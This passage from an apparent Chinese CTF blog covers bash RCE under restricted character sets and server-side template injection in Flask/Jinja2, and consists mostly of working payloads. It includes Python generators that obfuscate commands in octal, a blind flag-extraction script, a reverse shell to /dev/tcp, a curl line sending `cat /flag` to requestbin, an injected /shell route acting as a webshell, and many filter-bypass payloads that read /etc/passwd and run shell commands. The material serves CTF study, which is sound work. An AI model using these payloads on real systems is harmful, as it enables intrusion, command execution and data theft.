但是这种命令形式不支持带参数的复杂命令，仅支持不带参数的命令，是因为bash把这一个字符串当作整体，而没有把空格作为分隔符正确解析，所以，我们可以通过两次here-strings的方法来解析复杂的带参数命令。 12345678cmd = &#x27;ls -al&#x27;payload = &#x27;$0&lt;&lt;&lt;$0\\\\&lt;\\\\&lt;\\\\&lt;\\\\$\\\\\\&#x27;&#x27;for c in cmd: payload += f&#x27;\\\\\\\\$(($((1&lt;&lt;1))#&#123;bin(int(oct(ord(c))[2:]))[2:]&#125;))&#x27;payload += &#x27;\\\\\\&#x27;&#x27;print(payload) 仅含 &lt;$!&#123;&#125;()_&amp;可以尝试通过$&#123;!?&#125;和$&#123;!#&#125;的形式拿到bash，如果不行，仅能通过定义一个__=$(())的方式将__变量的值设置为0，然后通过$&#123;!__&#125;的形式拿到sh字符。两条命令间通过&amp;&amp;进行连接。至于为什么是两个下划线，是因为bash的变量命名规范是以下划线或者英文字母开头，可以包含下划线和英文字母数字。 可以通过$(())取到0，然后对0进行按位取反，可以得到-1，很多个-1进行排列 可以得到-2、-3、-4、-5、-6、-7、-8，然后再按位取反就可以得到1、2、3、4、5、6、7。这样就得到了8进制命令拼接的所有数字。 12345678910111213141516171819202122cmd = &#x27;ls -al&#x27;r = &#123;&#125;x = &#x27;$((~$(())))&#x27;#-1for i in range(1,9): r[i] = &#x27;$((~$((&#x27;+x for j in range(i): r[i] += x r[i] += &#x27;))))&#x27;r[0] = &#x27;$(())&#x27;payload = &#x27;__=$(())&amp;&amp;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\\\&lt;\\\\&lt;\\\\&lt;\\\\$\\\\\\&#x27;&#x27;for c in cmd: payload += &#x27;\\\\\\\\&#x27; for i in oct(ord(c))[2:]: payload += r[int(i)]payload += &#x27;\\\\\\&#x27;&#x27;print(payload) 仅含 &lt;$ &#123;&#125;\\#()&#39;0重定向+八进制+数字构造 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import requestsn = dict()n[0] = &#x27;0&#x27;n[1] = &#x27;$&#123;##&#125;&#x27; #$&#123;##&#125;计算#这个字符的长度为1，这里如果没有屏蔽!的话还可以用$((!$#))n[2] = &#x27;$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))&#x27; #通过位运算得到2n[3] = &#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;))&#x27; #通过二进制11转换为十进制得到3,4,5,6,7n[4] = &#x27;$(($&#123;##&#125;&lt;&lt;$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))))&#x27;n[5] = &#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;))&#x27;n[6] = &#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;0))&#x27;n[7] = &#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))&#x27;f=&#x27;&#x27;def str_to_oct(cmd): #命令转换成八进制字符串 s = &quot;&quot; for t in cmd: o = (&#x27;%s&#x27; % (oct(ord(t))))[2:] s+=&#x27;\\\\&#x27;+o return sdef build(cmd): #八进制字符串转换成字符 payload = &quot;$0&lt;&lt;&lt;$0\\&lt;\\&lt;\\&lt;\\$\\\\\\&#x27;&quot; s = str_to_oct(cmd).split(&#x27;\\\\&#x27;) for _ in s[1:]: payload+=&quot;\\\\\\\\&quot; for i in _: payload+=n[int(i)] return payload+&#x27;\\\\\\&#x27;&#x27;def get_flag(url,payload): #盲注函数 try: data = &#123;&#x27;cmd&#x27;:payload&#125; r = requests.post(url,data,timeout=1.5) except: return True return False#弹shell#print(build(&#x27;bash -i &gt;&amp; /dev/tcp/your-ip/2333 0&gt;&amp;1&#x27;))#盲注#a=&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_&#123;&#125;@&#x27;# for i in range(1,50):# for j in a:# cmd=f&#x27;cat /flag|grep ^&#123;f+j&#125;&amp;&amp;sleep 3&#x27;# url = &quot;http://ip/&quot;# if get_flag(url,build(cmd)):# break# f = f+j# print(f) 参考： 安洵杯2020 - Bash-Vino0o0o 34c3 CTF - minbashmaxfun","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"绕过","slug":"绕过","permalink":"https://lazzzaro.github.io/tags/%E7%BB%95%E8%BF%87/"},{"name":"RCE","slug":"RCE","permalink":"https://lazzzaro.github.io/tags/RCE/"}],"author":"Lazzaro"},{"title":"SSTI","slug":"web-SSTI","date":"2020-05-14T16:20:39.000Z","updated":"2025-04-19T09:19:20.018Z","comments":true,"path":"2020/05/15/web-SSTI/","permalink":"https://lazzzaro.github.io/2020/05/15/web-SSTI/","excerpt":"","text":"​ SSTI (Server-Side Template Injection)，即服务端模板注入攻击，通过与服务端模板的输入输出交互，在过滤不严格的情况下，构造恶意输入数据，从而达到读取文件或者getshell的目的。目前CTF常见的SSTI题中，环境多为python。 Python沙箱逃逸在 Python 中执行系统命令的方式有： os （模块用于访问操作系统功能的模块。通用操作：1.系统操作，2.目录操作，3.判断操作。） commands：仅限2.x （该模块在3.x中已经被subprocess取代。但是在2.x的早期版本中它也是重要的内置模块之一。） subprocess （模块用于管理子进程。可以调用外部命令作为子进程，还可以生成新的进程、连接到它们的input/output/error管道，同时获取它们的返回码。） timeit：timeit.sys、timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;, number=1) （时间模块，用于准确测量代码执行时间。该模块定义了三个实用函数和一个公共类。） platform：platform.os、platform.sys、platform.popen(&#39;whoami&#39;, mode=&#39;r&#39;, bufsize=-1).read() （该模块用于获得操作系统的相关信息。） pty：pty.spawn(&#39;ls&#39;)、pty.os （该模块定义了处理伪终端的操作：启动另一个进程并能够以编程方式写入和读取其控制终端。） bdb：bdb.os、cgi.sys cgi：cgi.os、cgi.sys … 基本操作查看全局变量： 1[变量名].__globals__ jinja环境变量： 12__init__.__globals__.app.jinja_env分隔符：variable_start_string/variable_end_string 读写文件 方法一常用函数： 123456789101112131415161718192021222324252627282930313233343536__class__ 类的一个内置属性，表示实例对象的类。__base__ 类型对象的直接基类__bases__ 类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases____mro__ 此属性是由类组成的元组，在方法解析期间会基于它来查找基类。__subclasses__() 返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.__init__ 初始化类，返回的类型是function__globals__ 使用方式是 函数名.__globals__获取function所处空间下可使用的模块、方法以及所有变量。查看所有键名：__globals__.keys()。__dic__ 类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里__getattribute__() 实例、类、函数都具有的__getattribute__魔术方法。可以直接通过这个方法来获取到实例、类、函数的属性。__getitem__() 调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.__getitem__(&#x27;b&#x27;)__builtins__ 内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。__import__ 动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]__str__() 返回描写这个对象的字符串，可以理解成就是打印出来。url_for flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。lipsum flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;current_app 应用上下文，一个全局变量。request 可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\\self\\fd/3&#x27;).read()request.args.x1 get传参request.values.x1 所有参数request.cookies cookies参数request.headers 请求头参数request.form.x1 post传参 (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)request.data post传参 (Content-Type:a/b)request.json post传json (Content-Type: application/json)config 当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;cycler &#123;&#123;cycler.__init__.__globals__.os.popen(&#x27;id&#x27;).read()&#125;&#125;joiner &#123;&#123;joiner.__init__.__globals__.os.popen(&#x27;id&#x27;).read()&#125;&#125;namespace &#123;&#123;namespace.__init__.__globals__.os.popen(&#x27;id&#x27;).read()&#125;&#125;写路由：app=__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]app.route(&quot;/shell&quot;,&quot;GET&quot;,lambda :__import__(&#x27;os&#x27;).popen(request.params.get(&#x27;cmd&#x27;)).read()) 常用过滤器： 1234567891011121314151617181920212223242526int()：将值转换为int类型；float()：将值转换为float类型；lower()：将字符串转换为小写；upper()：将字符串转换为大写；title()：把值中的每个单词的首字母都转成大写；capitalize()：把变量值的首字母转成大写，其余字母转小写；trim()：截取字符串前面和后面的空白字符；wordcount()：计算一个长字符串中单词的个数；reverse()：字符串反转；replace(value,old,new)： 替换将old替换为new的字符串；truncate(value,length=255,killwords=False)：截取length长度的字符串；striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;&#x27;&lt;em&gt;hello&lt;/em&gt;&#x27;|safe&#125;&#125;；list()：将变量列成列表；string()：将变量转换成字符串；join()：将一个序列中的参数值拼接成字符串。示例看上面payload；abs()：返回一个数值的绝对值；first()：返回一个序列的第一个元素；last()：返回一个序列的最后一个元素；format(value,arags,*kwargs)：格式化字符串。比如：&#123;&#123; &quot;%s&quot; - &quot;%s&quot;|format(&#x27;Hello?&#x27;,&quot;Foo!&quot;) &#125;&#125;将输出：Helloo? - Foo!length()：返回一个序列或者字典的长度；sum()：返回列表内数值的和；sort()：返回排序后的列表；default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#x27;xiaotuo&#x27;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。length()：返回字符串的长度，别名是count。 获取基本类： 12345&#x27;&#x27;.__class__.__mro__[2]&#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0]request.__class__.__mro__[8] #针对jinjia2/flask为[9]适用 获取基本类后，继续向下获取基本类(object)的子类： 1object.__subclasses__() 找到重载过的__init__类（在获取初始化属性后，带wrapper的说明没有重载，寻找不带wrapper的）： 12345&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[99].__init__&lt;slot wrapper &#x27;__init__&#x27; of &#x27;object&#x27; objects&gt;&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__&lt;unbound method WarningMessage.__init__&gt; 查看其引用__builtins__： builtins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块 1&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;] 这里会返回dict类型，寻找keys中可用函数，直接调用即可，使用keys中的file以实现读取文件的功能： 1&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;file&#x27;](&#x27;/etc/passwd&#x27;).read() 方法二存在的子模块可以通过.index()来进行查询，如果存在的话返回索引，直接调用即可： 12345&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[2].__subclasses__().index(file)40[].__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read() #将read() 修改为 write() 即为写文件 命令执行 利用eval 进行命令执行1&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;) 利用warnings.catch_warnings 进行命令执行查看warnings.catch_warnings方法的位置： 12&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(warnings.catch_warnings) 59 查看linecatch的位置： 12&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index(&#x27;linecache&#x27;) 25 查找os模块的位置： 12&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__.keys().index(&#x27;os&#x27;) 12 查找system方法的位置（在这里使用os.open().read()可以实现一样的效果,步骤一样,不再复述）： 12&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__.values()[12].__dict__.keys().index(&#x27;system&#x27;) 144 调用system方法： 12&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__.values()[12].__dict__.values()[144](&#x27;whoami&#x27;) root 直接搜索： 1&gt;&gt;&gt; [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == &#x27;catch_warnings&#x27;][0]()._module.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read() 利用commands 进行命令执行12345&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;commands&#x27;).getstatusoutput(&#x27;ls&#x27;)&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;ls&#x27;)&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read() 利用任意字符串或特殊变量123sss.__init__.__globals__.__builtins__.open(&quot;/flag&quot;).read()config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()request.application.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read() 绕过中括号 []pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。 在这里使用pop并不会真的移除，但却能返回其值，取代中括号，来实现绕过。 12&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()().__class__.__mro__.__getitem__(1).__subclasses__().pop(407)(&quot;cat /flag&quot;,shell=True,stdout=-1).communicate().__getitem__(0) unicode字符：［］，﹇﹈ 引号 ‘’request.args 是flask中的一个属性，为返回请求的参数，这里把path当作变量名,将后面的路径传值进来，进而绕过了引号的过滤。 1&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path=/etc/passwd unicode字符：＂＂，＇＇ 单下划线 _过滤了_可以用dir(0)[0][0]或者request[&#39;args&#39;]或者 request[&#39;values&#39;]绕过。 双下划线 __同样利用request.args属性。 1&#123;&#123; &#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__ 或者request.values属性。 1&#123;&#123;()|attr(request.values.x)|attr(request.values.y)|attr(request.values.a)()|attr(request.values.z)(185)|attr(request.values.b)|attr(request.values.c)|attr(request.values.z)(request.values.d)|attr(request.values.z)(request.values.e)(request.values.f)|attr(request.values.g)|attr(request.values.z)(request.values.h)(request.values.i)&#125;&#125;&amp;x=__class__&amp;y=__base__&amp;z=__getitem__&amp;a=__subclasses__&amp;b=__init__&amp;c=__globals__&amp;d=__builtins__&amp;e=__import__&amp;f=os&amp;g=__dict__&amp;h=system&amp;i=curl http://requestbin.net/r/1eqk6r61?p=`cat /flag` 点 .&#39;&#39;.__class__可以写成 getattr(&#39;&#39;,&#39;__class__&#39;)或者 &#39;&#39;|attr(&#39;__class__&#39;)。 &#39;&#39;.eval可以写成 &#39;&#39;|attr(&#39;__getitem__&#39;)(&#39;eval&#39;)。 &#39;&#39;.__class__可以写成&#39;&#39;[&#39;__class__&#39;] 双花括号 {%if [expression]==[value]%} yes {%endif%} {%print()%} unicode字符：︷︷︸︸ 圆括号unicode字符：⁽⁾，₍₎ 对函数执行方式重载，如 request.__class__.__getitem__=__builtins__.exec;，执行request[payload] 时相当于 exec(payload)。 lambda表达式。 外部参数利用（爆破下标）request.args或request.values。 列目录1&#123;&#123;&#123;&#125;|attr(request.args.param)|attr(request.args.mro)|attr(request.args.sub)()|attr(request.args.item)(475)|attr(request.args.init)|attr(request.args.g)|attr(request.args.item)(request.args.mod)|attr(request.args.func)(request.args.cmd)|attr(request.args.re)()&#125;&#125;&amp;param=__class__&amp;mro=__base__&amp;sub=__subclasses__&amp;item=__getitem__&amp;init=__init__&amp;g=__globals__&amp;mod=os&amp;func=popen&amp;cmd=ls&amp;re=read 读文件12&#123;&#123;&#123;&#125;|attr(request.args.param)|attr(request.args.mro)|attr(request.args.sub)()|attr(request.args.item)(475)(request.args.file)|attr(request.args.re)()&#125;&#125; &amp;param=__class__&amp;mro=__base__&amp;sub=__subclasses__&amp;item=__getitem__&amp;file=/etc/passwd&amp;re=read 数字unicode字符：𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗，𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡，０１２３４５６７８９ 对象层面 set {}=None 其他引用： &#123;&#123;% set config=None %&#125;&#125; =&gt; &#123;&#123;url_for.__globals__.current_app.config&#125;&#125; &#123;&#123;% set __builtins__=None %&#125;&#125; =&gt; &#123;&#123;[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__&#125;&#125; del 重载： reload(__builtins__) 其他 获得对应函数的上下文常量：func.__code__.co_consts 关键字 base64编码 __getattribute__使用实例访问属性时，调用该方法。 例如被过滤掉__class__关键词： 1&#123;&#123;[].__getattribute__(&#x27;X19jbGFzc19f&#x27;.decode(&#x27;base64&#x27;)).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125;&#125; 字符串拼接 1234567yyy.__init__.__globals__.__builtins__|attr(&#x27;__getit&#x27;&#x27;em__&#x27;)(&#x27;ev&#x27;&#x27;al&#x27;)(&#x27;__imp&#x27;&#x27;ort__(&quot;o&#x27;&#x27;s&quot;).po&#x27;&#x27;pen(&quot;ls /&quot;).re&#x27;&#x27;ad()&#x27;)[].__getattribute__(&#x27;__c&#x27;+&#x27;lass__&#x27;).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()[].__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__[&quot;op&quot;+&quot;en&quot;](&quot;/fl&quot;+&quot;ag&quot;).read()&#123;%print config|attr(&#x27;%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,99,108,97,115,115,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c&#x27;|format(95,95,105,110,105,116,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,108,111,98,97,108,115,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,101,116,105,116,101,109,95,95))(&#x27;o&#x27;+&#x27;s&#x27;)|attr(&#x27;%c%c%c%c%c&#x27;|format(112,111,112,101,110))(&#x27;ls&#x27;)|attr(&#x27;%c%c%c%c&#x27;|format(114,101,97,100))()%&#125;&#123;%print(((lipsum[(session|string)[35:46]])[(session|string)[53:55]])[(session|string)[73:78]]((session|string)[85:139]))%&#125; 反转 1&#123;&#123;cycler[&#x27;__tini__&#x27;[::-1]][&#x27;__slabolg__&#x27;[::-1]].os.popen(&#x27;id&#x27;).read()&#125;&#125; lower() 1&#123;&#123;sss.__init__.__globals__.__builtins__.open(&quot;/FLAG&quot;.lower()).read()&#125;&#125; 清空关键字list 12[关键字list变量名].clear()open(&quot;/flag&quot;).read() 16进制 1.__class__ =&gt; [&quot;\\x5f\\x5fc\\x6cass\\x5f\\x5f&quot;] 8进制 12345678910.__class__ =&gt; [&quot;\\137\\137\\143\\154\\141\\163\\163\\137\\137&quot;].__base__ =&gt; [&quot;\\137\\137\\142\\141\\163\\145\\137\\137&quot;].__subclasses__ =&gt; [&quot;\\137\\137\\163\\165\\142\\143\\154\\141\\163\\163\\145\\163\\137\\137&quot;].__init__ =&gt; [&quot;\\137\\137\\151\\156\\151\\164\\137\\137&quot;].__globals__ =&gt; [&quot;\\137\\137\\147\\154\\157\\142\\141\\154\\163\\137\\137&quot;].__builtins__ =&gt; [&quot;\\137\\137\\142\\165\\151\\154\\164\\151\\156\\163\\137\\137&quot;].__import__ =&gt; [&quot;\\137\\137\\151\\155\\160\\157\\162\\164\\137\\137&quot;]os =&gt; [&quot;\\157\\163&quot;].popen =&gt; [&quot;\\160\\157\\160\\145\\156&quot;].read =&gt; [&quot;\\162\\145\\141\\144&quot;] unicode编码 1.__class__ =&gt; [&quot;\\u005f\\u005f\\u0063\\u006c\\u0061\\u0073\\u0073\\u005f\\u005f&quot;] unicode字符 / Non-ASCII Identifies 𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳 𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡𝕒𝕓𝕔𝕕𝕖𝕗𝕘𝕙𝕚𝕛𝕜𝕝𝕞𝕟𝕠𝕡𝕢𝕣𝕤𝕥𝕦𝕧𝕨𝕩𝕪𝕫 ０１２３４５６７８９ 参考：https://www.compart.com/en/unicode/U+0030 attr与过滤器 如果没有过滤globals，从globals里把eval函数找出来，然后构造任意字符串放进去RCE即可。 参考：https://www.gem-love.com/ctf/2598.html 123456789101112131415161718192021222324252627282930313233&#123;% set xhx = ((&#123; &#125;|select()|string()|list()).pop(24)|string())%&#125; # _&#123;% set spa = ((app.__doc__|list()).pop(102)|string())%&#125; #空格&#123;% set pt = ((app.__doc__|list()).pop(320)|string())%&#125; #点&#123;% set yin = ((app.__doc__|list()).pop(337)|string())%&#125; #单引号&#123;% set left = ((app.__doc__|list()).pop(264)|string())%&#125; #左括号(&#123;% set right = ((app.__doc__|list()).pop(286)|string())%&#125; #右括号)&#123;% set slas = (y1ng.__init__.__globals__.__repr__()|list()).pop(349)%&#125; #斜线/&#123;% set bu = dict(buil=aa,tins=dd)|join() %&#125; #builtins&#123;% set im = dict(imp=aa,ort=dd)|join() %&#125; #import&#123;% set sy = dict(po=aa,pen=dd)|join() %&#125; #popen&#123;% set os = dict(o=aa,s=dd)|join() %&#125; #os&#123;% set ca = dict(ca=aa,t=dd)|join() %&#125; #cat&#123;% set flg = dict(fl=aa,ag=dd)|join() %&#125; #flag&#123;% set ev = dict(ev=aa,al=dd)|join() %&#125; #eval&#123;% set red = dict(re=aa,ad=dd)|join()%&#125; #read&#123;% set bul = xhx*2~bu~xhx*2 %&#125; #__builtins__#拼接起来 __import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&#123;% set pld = xhx*2~im~xhx*2~left~yin~os~yin~right~pt~sy~left~yin~ca~spa~slas~flg~yin~right~pt~red~left~right %&#125; &#123;% for f,v in y1ng.__init__.__globals__.items() %&#125; #globals &#123;% if f == bul %&#125; &#123;% for a,b in v.items() %&#125; #builtins &#123;% if a == ev %&#125; #eval &#123;&#123;b(pld)&#125;&#125; #eval(pld) &#123;% endif %&#125; &#123;% endfor %&#125; &#123;% endif %&#125;&#123;% endfor %&#125;#payload#&#123;%%20set%20xhx%20=%20((&#123;%20&#125;|select()|string()|list()).pop(24)|string())%&#125;&#123;%%20set%20spa%20=%20((app.__doc__|list()).pop(102)|string())%&#125;&#123;%%20set%20pt%20=%20((app.__doc__|list()).pop(320)|string())%&#125;%20&#123;%%20set%20yin%20=%20((app.__doc__|list()).pop(337)|string())%&#125;&#123;%%20set%20left%20=%20((app.__doc__|list()).pop(264)|string())%&#125;%20&#123;%%20set%20right%20=%20((app.__doc__|list()).pop(286)|string())%&#125;%20&#123;%%20set%20slas%20=%20(y1ng.__init__.__globals__.__repr__()|list()).pop(349)%&#125;%20&#123;%%20set%20bu%20=%20dict(buil=aa,tins=dd)|join()%20%&#125;&#123;%%20set%20im%20=%20dict(imp=aa,ort=dd)|join()%20%&#125;&#123;%%20set%20sy%20=%20dict(po=aa,pen=dd)|join()%20%&#125;&#123;%%20set%20os%20=%20dict(o=aa,s=dd)|join()%20%&#125;%20&#123;%%20set%20ca%20=%20dict(ca=aa,t=dd)|join()%20%&#125;&#123;%%20set%20flg%20=%20dict(fl=aa,ag=dd)|join()%20%&#125;&#123;%%20set%20ev%20=%20dict(ev=aa,al=dd)|join()%20%&#125;%20&#123;%%20set%20red%20=%20dict(re=aa,ad=dd)|join()%&#125;&#123;%%20set%20bul%20=%20xhx*2~bu~xhx*2%20%&#125;&#123;%%20set%20pld%20=%20xhx*2~im~xhx*2~left~yin~os~yin~right~pt~sy~left~yin~ca~spa~slas~flg~yin~right~pt~red~left~right%20%&#125;%20&#123;%%20for%20f,v%20in%20y1ng.__init__.__globals__.items()%20%&#125;&#123;%%20if%20f%20==%20bul%20%&#125;&#123;%%20for%20a,b%20in%20v.items()%20%&#125;&#123;%%20if%20a%20==%20ev%20%&#125;&#123;&#123;b(pld)&#125;&#125;&#123;%%20endif%20%&#125;&#123;%%20endfor%20%&#125;&#123;%%20endif%20%&#125;&#123;%%20endfor%20%&#125; 12345678910111213141516171819202122&#123;%set a=dict(po=x,p=x)|join%&#125; #pop&#123;%set b=(()|select|string|list)|attr(a)(𝟐𝟒)%&#125; #_&#123;%set c=(b,b,dict(do=x,c=x)|join,b,b)|join()%&#125; #__doc__&#123;%set d=(x|attr(c)|list)|attr(a)(𝟑𝟑𝟕)%&#125; #单引号&#123;%set e=(x|attr(c)|list)|attr(a)(𝟐𝟔𝟒)%&#125; #左括号(&#123;%set f=(x|attr(c)|list)|attr(a)(𝟐𝟖𝟔)%&#125; #右括号)&#123;%set g=(x|attr(c)|list)|attr(a)(𝟑𝟐𝟎)%&#125; #点.&#123;%set h=(x|attr(c)|list)|attr(a)(𝟏𝟎𝟐)%&#125; #空格&#123;%set i=(b,b,dict(in=x,it=x)|join,b,b)|join()%&#125; #__init__&#123;%set j=(b,b,dict(glo=x,bals=x)|join,b,b)|join()%&#125; #__globals__&#123;%set k=(b,b,dict(ge=x,titem=x)|join,b,b)|join()%&#125; #__getitem__&#123;%set l=(b,b,dict(buil=x,tins=x)|join,b,b)|join()%&#125; #__builtins__&#123;%set m=(b,b,dict(im=x,port=x)|join,b,b)|join()%&#125; #__import__&#123;%set n=(x|attr(i)|attr(j)|string|list)|attr(a)(𝟑𝟒𝟗)%&#125;&#123;%set o=dict(ev=x,al=x)|join()%&#125; #eval&#123;%set p=dict(o=x,s=x)|join()%&#125; #os&#123;%set q=dict(po=x,pen=x)|join()%&#125; #popen&#123;%set r=dict(re=x,ad=x)|join()%&#125; #read&#123;%set s=(dict(ls=x)|join,h,n,dict(var=x)|join,n,dict(www=x)|join,n,dict(flask=x)|join)|join()%&#125;&#123;%set t=(m,e,d,p,d,f,g,q,e,d,s,d,f,g,r,e,f)|join()%&#125;&#123;%set u=x|attr(i)|attr(j)|attr(k)(l)|attr(k)(o)(t)%&#125;&#123;&#123;u&#125;&#125; 1234567891011121314151617181920212223&#123;% set id=dict(ind=a,ex=a)|join%&#125;&#123;% set pp=dict(po=a,p=a)|join%&#125;&#123;% set ls=dict(ls=a)|join%&#125;&#123;% set ppe=dict(po=a,pen=a)|join%&#125;&#123;% set gt=dict(ge=a,t=a)|join%&#125;&#123;% set cr=dict(ch=a,r=a)|join%&#125;&#123;% set nn=dict(n=a)|join%&#125;&#123;% set tt=dict(t=a)|join%&#125;&#123;% set ff=dict(f=a)|join%&#125;&#123;% set ooqq=dict(o=a,s=a)|join %&#125;&#123;% set rd=dict(re=a,ad=a)|join%&#125;&#123;% set five=(lipsum|string|list)|attr(id)(tt) %&#125;&#123;% set three=(lipsum|string|list)|attr(id)(nn) %&#125;&#123;% set one=(lipsum|string|list)|attr(id)(ff) %&#125;&#123;% set shiba=five*five-three-three-one %&#125;&#123;% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %&#125;&#123;% set gb=(xiahuaxian,xiahuaxian,dict(glob=a,als=a)|join,xiahuaxian,xiahuaxian)|join %&#125;&#123;% set bin=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join %&#125;&#123;% set chcr=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;&#123;% set xiegang=chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%&#125;&#123;% set space=chcr(three*three*five-five-five-three) %&#125;&#123;% set shell=(ls,space,xiegang,dict(var=a)|join,xiegang,dict(www=a)|join,xiegang,dict(flask=a)|join)|join 